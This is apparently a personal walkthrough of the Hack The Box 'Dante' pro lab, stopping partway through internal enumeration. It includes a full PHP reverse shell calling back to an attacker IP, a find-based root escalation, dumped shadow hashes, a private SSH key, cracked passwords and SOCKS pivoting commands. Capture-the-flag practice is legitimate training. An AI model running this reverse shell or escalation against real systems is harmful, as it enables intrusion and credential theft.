# HTB Pro Lab: Dante

Overview:

The company has not undergone a comprehensive penetration test in the past, and want to reduce their technical debt. They are concerned that any actual breach could lead to a loss of earnings and reputation damage.

Upon breaching the perimeter, you are required to explore the network, moving laterally and vertically, until you gain administrative control over all hosts and reach domain admin. You will level up your skills in information gathering and situational awareness, be able to exploit Windows and Linux buffer overflows, gain familiarity with the Metasploit Framework, and much else!

There are many flags to be captured along the way, some on the main attack path and others in side-quests that you must go looking for. Submitting flags will propel you through the Hall of Fame, rewarding you with badges in the process.

This Penetration Tester Level I lab will expose players to:

    Enumeration
    Exploit Development
    Lateral Movement
    Privilege Escalation
    Web Application Attacks

Your entry point is in 10.10.110.0/24. The firewall at 10.10.110.2 is out of scope

Step #1:  Enumeration:

In beginning my enumeration of this environment, I've discovered the following ports with Nmap.:
![[./_resources/HTB_Pro_Lab_Dante.resources/image.png]]
I notice there is a website titled "you can't get at me bro" and the mention of a txt file titled robots.txt. I also noticed that anonymous login is actually also allowed with FTP. There is also an open SSH port as well. Definitely running UNIX.

Step #2: FTP:

I was able to access the machine via FTP using "ftp" as the user and "password" as the password. From there, I was able to find directories that were hidden and other ones. I found the "Incoming" directory which contained the "todo.txt" file containing good information for leads on where to check or look later on.
![[./_resources/HTB_Pro_Lab_Dante.resources/image.1.png]]![[./_resources/HTB_Pro_Lab_Dante.resources/image.2.png]]
Step #3:  Wordpress Site:

Next, I went ahead and checked out the wordpress site that is hosted by this machine and checked for other directories with Gobuster and the common.txt wordlist.:

![[./_resources/HTB_Pro_Lab_Dante.resources/image.3.png]]

![[./_resources/HTB_Pro_Lab_Dante.resources/image.4.png]]

When accessing the robots.txt file in the site, I obtain the following:
![[./_resources/HTB_Pro_Lab_Dante.resources/image.5.png]]
I decided to run another dictionary attack with Dirbuster this time around since I recall getting way more directories in another penetration test. As expected, the results were actually substantial this time. The file containing all of the files and directories is listed below due to the volume of information.:
![[./_resources/HTB_Pro_Lab_Dante.resources/DirBusterReport-10.csv]]
The txt version is stored on the Kali Linux machine Desktop.

After going through some of the directories, I found two important pages. One is the login page which recongnizes the user "james" as a valid entry. This means I should be able to bruteforce into that account since the password is weak per the previously found "todo.txt" file.

The second page is a list of media files which I will need to inspect. This is listed below:

![[./_resources/HTB_Pro_Lab_Dante.resources/image.6.png]]
The parent directories take me here:
```
http://10.10.110.100:65000/wordpress/wp-includes/js/
```
The above directory may include important user information or cookie ID's that may be associated to a particular user. Other valuable information is sure to be here somewhere so I will need to investigate carefully as this tree contains many directories and files.

After going up directories to getting to the parent ones, I was then sent to the admin and "uncategorized" welcome pages which is interesting. It seems I have just accessed the admin page from the exposed tree using the above path. The admin page is:
```
http://10.10.110.100:65000/wordpress/index.php/author/admin/
```
The uncategorized page is:
```
http://10.10.110.100:65000/wordpress/index.php/category/uncategorized/
```

I found a test cookie on both the admin page and the user.php file when viewing the storage with web dev tools.
![[./_resources/HTB_Pro_Lab_Dante.resources/image.7.png]]
Value:
```
WP%20Cookie%20check
```
Name:
```
wordpress_test_cookie
```

For additional information, check the saved website for tips in Kali. So far, I've created the wordlist using ferox and cewl per the tips. The saved file is in my root directory and is called cewl.txt. Now, I need to figure out how to use Burpsuite with this agains the login page. The instructions provided don't show much of the configuration itself.

I finally found Jame's password for the wordpress site using the custom wordlist I made with cewl!:
![[./_resources/HTB_Pro_Lab_Dante.resources/image.8.png]]

```
Password: Toyota
```

Here is the dashboard screen after logging in:
![[./_resources/HTB_Pro_Lab_Dante.resources/image.9.png]]
I found login credentials to an email account.:
![[./_resources/HTB_Pro_Lab_Dante.resources/image.10.png]]

Under the "users" section, The actual admin account has the following email linked: [a@b.com](mailto:a@b.com).

I created a new user (admin) on the site since James had the ability to do so. Not a good idea for a regular user if you ask me.:
![[./_resources/HTB_Pro_Lab_Dante.resources/image.11.png]]

```
Email for the above account: test@b.com
```

In checking the comment section, I noticed the comments are numbered in the URL as an ID type of parameter. In conducting a Burpsuite scan using numbers from 1 to 65, I found the following. #16 cannot be access due to insufficient privileges apparently.
![[./_resources/HTB_Pro_Lab_Dante.resources/image.12.png]]
The URL found in the response for the comment#16 may be relevant as it redirected me to the #16 comment. Perhaps I can access it indirectly from there?:

Notice: Undefined variable: daemon in /var/www/html/wordpress/wp-content/plugins/akismet/akismet.php on line 250
WARNING: Failed to daemonise. This is quite common and not fatal.
Warning: fsockopen(): unable to connect to 10.10.15.115:8899 (Connection refused) in /var/www/html/wordpress/wp-content/plugins/akismet/akismet.php on line 166

Notice: Undefined variable: daemon in /var/www/html/wordpress/wp-content/plugins/akismet/akismet.php on line 250
Connection refused (111)

After using WPScan tool (for WordPress sites, I found several paths I hadn't visited before. I also found a critical vulnerability where a vim swap file had been kept. In looking this up, these are files that get saved by VIM in the event the app closes or crashes during an edit. This file specifically stores all of the credentials for the applicable database associated with this Wordpress site which is an SQL server.
I was actually on the right track attempting to establish a reverse shell by modifying the .php file in the theme editor on the site. Using the javascript pentest monkey should actually allow me to connect to it from a netcat session after setting my Tun0 IP and the matching port after triggering the 404 error page to load. He suggested that I focus on the twenty seventeen theme and then activate it afterwards and trigger the page. Theoretically, this should allow me to establish the connection. However,  I did attempt this previously which resulted in 0 connections. I will reattempt this effort at a later time now that I know this is actually the correct way forward. I was on the right track!!..

```
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.16.101';  // CHANGE THIS
$port = 9999;      // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
//
// Daemonise ourself if possible to avoid zombies later
//
// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
// Fork and have the parent process exit
$pid = pcntl_fork();
if ($pid == -1) {
printit("ERROR: Can't fork");
exit(1);
}
if ($pid) {
exit(0);  // Parent exits
}
// Make the current process a session leader
// Will only succeed if we forked
if (posix_setsid() == -1) {
printit("Error: Can't setsid()");
exit(1);
}
$daemon = 1;
} else {
printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}
// Change to a safe directory
chdir("/");
// Remove any umask we inherited
umask(0);
//
// Do the reverse shell...
//
// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
printit("$errstr ($errno)");
exit(1);
}
// Spawn shell process
$descriptorspec = array(
  0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
  1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
  2 => array("pipe", "w")  // stderr is a pipe that the child will write to
);
$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) {
printit("ERROR: Can't spawn shell");
exit(1);
}
// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
printit("Successfully opened reverse shell to $ip:$port");
while (1) {
// Check for end of TCP connection
if (feof($sock)) {
printit("ERROR: Shell connection terminated");
break;
}
// Check for end of STDOUT
if (feof($pipes[1])) {
printit("ERROR: Shell process terminated");
break;
}
// Wait until a command is end down $sock, or some
// command output is available on STDOUT or STDERR
$read_a = array($sock, $pipes[1], $pipes[2]);
$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
// If we can read from the TCP socket, send
// data to process's STDIN
if (in_array($sock, $read_a)) {
if ($debug) printit("SOCK READ");
$input = fread($sock, $chunk_size);
if ($debug) printit("SOCK: $input");
fwrite($pipes[0], $input);
}
// If we can read from the process's STDOUT
// send data down tcp connection
if (in_array($pipes[1], $read_a)) {
if ($debug) printit("STDOUT READ");
$input = fread($pipes[1], $chunk_size);
if ($debug) printit("STDOUT: $input");
fwrite($sock, $input);
}
// If we can read from the process's STDERR
// send data down tcp connection
if (in_array($pipes[2], $read_a)) {
if ($debug) printit("STDERR READ");
$input = fread($pipes[2], $chunk_size);
if ($debug) printit("STDERR: $input");
fwrite($sock, $input);
}
}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
if (!$daemon) {
print "$string\n";
}
}
?>
```
<http://192.168.1.101/wordpress/wp-content/themes/twentyfifteen/404.php>

I finally compromised the theme and obtained the following information:
![[./_resources/HTB_Pro_Lab_Dante.resources/image.13.png]]
I found the user "ironman" which had a ".sudo\_as\_admin\_successful" file which I could not open.  James is in the users listing and has the flag.txt. root is in there as well and another user called secnigma.

$ cat last-crawl.txt
1662737305$

???

The new internal subnet!:
![[./_resources/HTB_Pro_Lab_Dante.resources/image.14.png]]

I found a password for Balthazar for Mysql:
![[./_resources/HTB_Pro_Lab_Dante.resources/image.15.png]]

Important?:
![[./_resources/HTB_Pro_Lab_Dante.resources/image.16.png]]
The Home / tmp directory shows enumeration scripts and files that mention specific priv esc vulnerabilities.

LinEnum enumeration:
![[./_resources/HTB_Pro_Lab_Dante.resources/LinEnum for Dante Prolab #1.txt]]
And the second scan revealed:

![[./_resources/HTB_Pro_Lab_Dante.resources/LinEnum for Dante ProLab.txt]]
Just toying around, I decided to try to su as james and using his previously found password...which WORKED!!! I was able to get the second flag!!!
![[./_resources/HTB_Pro_Lab_Dante.resources/image.17.png]]
Network enumeration of internal subnet with linpeas:
![[./_resources/HTB_Pro_Lab_Dante.resources/image.18.png]]
I was able to run a command using find with root privileges as shown below:
```
find test.txt -exec "/bin/bash" -p \;
whoami
root
```
"test.txt" is just a file I created that is empty. I tried setting up a reverse shell with netcat but it did not work as it sawn my IP as a directory for some reason.

Exploring etc/shadow, I was able to pull the hash of the password for the root user and the others as well:

```
root:$6$x4WJxwj1947yL6zO$As.M0EzqLeVJ6D64WhbrTJ4Ei.H72sYNnaXttuoMCzLbZpTdNs64iYpqR5Gy870jTNyOkkTqEohORLrZYF.al1:18445:0:99999:7:::
daemon:*:18375:0:99999:7:::
bin:*:18375:0:99999:7:::
sys:*:18375:0:99999:7:::
sync:*:18375:0:99999:7:::
games:*:18375:0:99999:7:::
man:*:18375:0:99999:7:::
lp:*:18375:0:99999:7:::
mail:*:18375:0:99999:7:::
news:*:18375:0:99999:7:::
uucp:*:18375:0:99999:7:::
proxy:*:18375:0:99999:7:::
www-data:*:18375:0:99999:7:::
backup:*:18375:0:99999:7:::
list:*:18375:0:99999:7:::
irc:*:18375:0:99999:7:::
gnats:*:18375:0:99999:7:::
nobody:*:18375:0:99999:7:::
systemd-network:*:18375:0:99999:7:::
systemd-resolve:*:18375:0:99999:7:::
systemd-timesync:*:18375:0:99999:7:::
messagebus:*:18375:0:99999:7:::
syslog:*:18375:0:99999:7:::
_apt:*:18375:0:99999:7:::
tss:*:18375:0:99999:7:::
uuidd:*:18375:0:99999:7:::
tcpdump:*:18375:0:99999:7:::
avahi-autoipd:*:18375:0:99999:7:::
usbmux:*:18375:0:99999:7:::
rtkit:*:18375:0:99999:7:::
dnsmasq:*:18375:0:99999:7:::
cups-pk-helper:*:18375:0:99999:7:::
speech-dispatcher:!:18375:0:99999:7:::
avahi:*:18375:0:99999:7:::
kernoops:*:18375:0:99999:7:::
saned:*:18375:0:99999:7:::
nm-openvpn:*:18375:0:99999:7:::
hplip:*:18375:0:99999:7:::
whoopsie:*:18375:0:99999:7:::
colord:*:18375:0:99999:7:::
geoclue:*:18375:0:99999:7:::
pulse:*:18375:0:99999:7:::
gnome-initial-setup:*:18375:0:99999:7:::
gdm:*:18375:0:99999:7:::
systemd-coredump:!!:18391::::::
mysql:!:18391:0:99999:7:::
ftp:*:18391:0:99999:7:::
james:$6$OYTSXXkZWSSwlkBv$Gqn4PsOZ4vB7NA899oRahS7YdJlnLGK17YKcq3q4Yif.3TUxw2HTLlN3vlcapqZ2n7NcMJOcsSjcdFofK3dcu/:18391:0:99999:7:::
sshd:*:18391:0:99999:7:::
balthazar:$6$ADBqqluuRH6W2..l$WKhIu1hD1xnlq9/ZFgLvuWjH11nSGN4FgWVHBTr9e9TtDnmrnc.DuVhQqRdmv07zTYA8/4N3cigy1V9uuf7Ie0:18391:0:99999:7:::
```

I also found the last flag in the root directory:
![[./_resources/HTB_Pro_Lab_Dante.resources/image.19.png]]
Authorized SSH keys found:
```
cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC5bQsTVIu/W6wqaE46s2w7MUyMcvUY7Vb3aDKZvn/rM/MceC7mHT7YymncaovXJF+GOFBofLMp0+bvIZHKndg5CFjGI5uWkxqaQszz1xyai8uDfDWl6aEKlBfOEQIX7G5k6VqUndx2N8roJfciC1eVV7qrpkNa9vi2n5yHIDPbV83u2NU3rQNY6O3NKv4xQp9gxHshowvilrV1z2/QfCOiq9HqRpVPb//F3bmrDBPC3v84k/ubjpejbv1Puf4pL9JtoEXMX8qLN1JelF4SBaomkiv1gDspRTFix1wadxFA+32JNCPVAclDBzESuUbCOPi4s2G64upB8F0brg2e9cWf6lNP/ZmW7BtdzljYbhI1wAgtDx7vOCa+dme8nbiCnDs7ZUSA4V4b734soR5BlDNy41iM9Mf74pPkFeS7o+TiG0nx9XN1IA5t2THvgqFhM5VWUCXlnDK181d3UvHc8hO2RDEjqAcVFgfByPYLtESDLUeZu6bw1xmZY5xOQi9u+Rc=
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDtfMzPg9gxfQ/FtrwrvWBygZENccGUT9k4tWKNGzTFP2IFKS0vvRhQt21QuXuc9ZfsPNVasOS//8grfSfEuYh6SPlMlNg/dxH7YMCkLpLe3qty0Igtj7G/MFa7CntYeprKSBj3J3ClEqV9wmJTVGmOft6YK+FJdxPXTiqutBZlcHTVa6a/cAweePI6g9EFpRf2fB4RHkVPc6bvPKvPrsP8sklEZ7ThpHQkyrhKpdUNBS3qCN3j6AtM7pm+RZqq0aNvtuN7rkA70W8GnMOvnRM1Z4Z9hHbzsSfzJOD4RUyk7h+ceniSWoL4Jg618aKgRGuXlBRu68RqI4EuUXWc+yz8F91Y8ZpGcWcekDyI9ygqz1Rl0MmadbYy4BMd5yRh9g4Cftek1WA63DMY5udWS9OpWpeTtThoTMQA1xhzEZQyw40KDASbiauWiQ/HEUmnRz5SFuadFUYcIwsOTHD38yasHC5nMAFPh8Qco2MBpK995HubnFSEOyOfFLNcm0Q+6W8=
```
Found rsa private key:
```
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```
Found public key:
```
cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC5bQsTVIu/W6wqaE46s2w7MUyMcvUY7Vb3aDKZvn/rM/MceC7mHT7YymncaovXJF+GOFBofLMp0+bvIZHKndg5CFjGI5uWkxqaQszz1xyai8uDfDWl6aEKlBfOEQIX7G5k6VqUndx2N8roJfciC1eVV7qrpkNa9vi2n5yHIDPbV83u2NU3rQNY6O3NKv4xQp9gxHshowvilrV1z2/QfCOiq9HqRpVPb//F3bmrDBPC3v84k/ubjpejbv1Puf4pL9JtoEXMX8qLN1JelF4SBaomkiv1gDspRTFix1wadxFA+32JNCPVAclDBzESuUbCOPi4s2G64upB8F0brg2e9cWf6lNP/ZmW7BtdzljYbhI1wAgtDx7vOCa+dme8nbiCnDs7ZUSA4V4b734soR5BlDNy41iM9Mf74pPkFeS7o+TiG0nx9XN1IA5t2THvgqFhM5VWUCXlnDK181d3UvHc8hO2RDEjqAcVFgfByPYLtESDLUeZu6bw1xmZY5xOQi9u+Rc= root@DANTE-WEB-NIX01
```

In this case, I don't need to generate a new SSH keypair since there is already a private key that I have copied to my priv\_keys directory in addition to the public key. In this case, I just needed to execute the following command after adding the [127.0.0.0](http://127.0.0.0) socks5 address to proxychain4.conf in etc and disabling the other ones.
```
ssh -D 7777 -f -N balthazar@10.10.110.100 -i priv_keys/id_rsa_2
```

I used balthazar because I need to authenticate with his local password (TheJoker12345!) and the above is\_rsa\_2 file contains the public key from the host machine.

Once the connection is established, this can be verified with netstat. From there, I can then use proxychains to access the internal subnet and execute commands. When using Nmap, only -sT scans work.

ssh -D 7777 -f -N balthazar@10.10.110.100 -i id\_rsa\_2

To access the internal subnet as well, I have seen nmap binary installed on the system from other users. In this case, what I did was to do a ping scan using the below command for the subnet to identify live hosts. From there, I can just feed the results into nmap to conduct a normal scan which should work and cut down vast amounts of time.

```
for i in {1..254} ;do (ping -c 1 172.16.1.$i | grep "bytes from" &) ;done
```

Results from the ping sweep:
```
for i in {1..254} ;do (ping -c 1 172.16.1.$i | grep "bytes from" &) ;done   
64 bytes from 172.16.1.5: icmp_seq=1 ttl=128 time=0.312 ms
64 bytes from 172.16.1.10: icmp_seq=1 ttl=64 time=0.165 ms
64 bytes from 172.16.1.12: icmp_seq=1 ttl=64 time=0.180 ms
64 bytes from 172.16.1.13: icmp_seq=1 ttl=128 time=0.218 ms
64 bytes from 172.16.1.17: icmp_seq=1 ttl=64 time=0.219 ms
64 bytes from 172.16.1.19: icmp_seq=1 ttl=64 time=0.147 ms
64 bytes from 172.16.1.20: icmp_seq=1 ttl=128 time=0.233 ms
64 bytes from 172.16.1.100: icmp_seq=1 ttl=64 time=0.015 ms
64 bytes from 172.16.1.101: icmp_seq=1 ttl=128 time=0.375 ms
64 bytes from 172.16.1.102: icmp_seq=1 ttl=128 time=0.390 ms
```

### Internal Subnet 172.16.1.0/24:

Starting with [172.16.1.10](http://172.16.1.10), I was able to access the site after setting the proxy [127.0.0.1](http://127.0.0.1) with port 9999 in Burpsuite. From there, I visited the website the machine hosts and remembering the LFI vulnerability previously mentioned, I was able to pull the etc/passwd information as shown below:

```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin saned:x:117:123::/var/lib/saned:/usr/sbin/nologin nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false whoopsie:x:120:125::/nonexistent:/bin/false colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin geoclue:x:122:127::/var/lib/geoclue:/usr/sbin/nologin pulse:x:123:128:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin gnome-initial-setup:x:124:65534::/run/gnome-initial-setup/:/bin/false gdm:x:125:130:Gnome Display Manager:/var/lib/gdm3:/bin/false frank:x:1000:1000:frank,,,:/home/frank:/bin/bash systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin margaret:x:1001:1001::/home/margaret:/bin/lshell mysql:x:126:133:MySQL Server,,,:/nonexistent:/bin/false sshd:x:127:65534::/run/sshd:/usr/sbin/nologin omi:x:998:997::/home/omi:/bin/false omsagent:x:997:998:OMS agent:/var/opt/microsoft/omsagent/run:/bin/bash nxautomation:x:996:995:nxOMSAutomation:/home/nxautomation/run:/bin/bash
```

I thought about where the previous two flags were in the Jame's directory and I decided to test that path out for both found users from the above /etc/passwd path. Turns out, the next flag was in Margaret's Home directory!
```
DANTE{LF1_M@K3s_u5_lol}
```

Now that I have the user flag, I'm thinking I should be able to get a shell somehow through this LFI vulnerability and escalate privileges to get the root flag.
![[./_resources/HTB_Pro_Lab_Dante.resources/image.20.png]]

* I may be able to establish a shell with the LFI vulnerability. Check the bookmarked page in Firefox.

            Also check in msfconsole.

* Another thing I need to try is to read text files by downloading them (check same bookmarked page). They will be base64 encoded so it won't execute the PHP code and will allow me to decode them easily when downloaded.
* Also, another potential trick would be to try bruteforcing the ssh login for [172.16.1.10](http://172.16.1.10)  with cewl wordlists both old and new and perhaps other short ones. I know frank, margaret and of course, root all exist in this machine. The hint for the next flag "fake it til' you make it" makes me think about this method of access potentially.

In running a Nikto scan, the following vulnerabilities showed up:

```
+ OSVDB-3268: /css/: Directory indexing found.
+ OSVDB-3092: /css/: This might be interesting...
+ OSVDB-3268: /img/: Directory indexing found.
+ OSVDB-3092: /img/: This might be interesting...
```

```
Nmap scan of 172.16.1.10:
Nmap scan report for 172.16.1.10
Host is up (0.053s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 55.43 seconds
```

When querying AD domain, I found the following information via rpcclient:
```
rpcclient $> querydominfo
Domain: WORKGROUP
Server: DANTE-NIX02
Comment: DANTE-NIX02 server (Samba, Ubuntu)
Total Users: 0
Total Groups: 0
Total Aliases: 0
Sequence No: 1663443344
Force Logoff: -1
Domain Server State: 0x1
Server Role: ROLE_DOMAIN_PDC
Unknown 3: 0x1
```
Domain password information:
```
rpcclient $> getdompwinfo
min_password_length: 5
password_properties: 0x00000000
```

Domain user information for margaret and frank:
```
rpcclient $> lookupnames frank
frank S-1-22-1-1000 (User: 1)
rpcclient $> lookupnames margaret
margaret S-1-22-1-1001 (User: 1)
rpcclient $>
```
Available Network Shares:
```
rpcclient $> netshareenumall
netname: print$
remark: Printer Drivers
path: C:\var\lib\samba\printers
password:
netname: SlackMigration
remark:
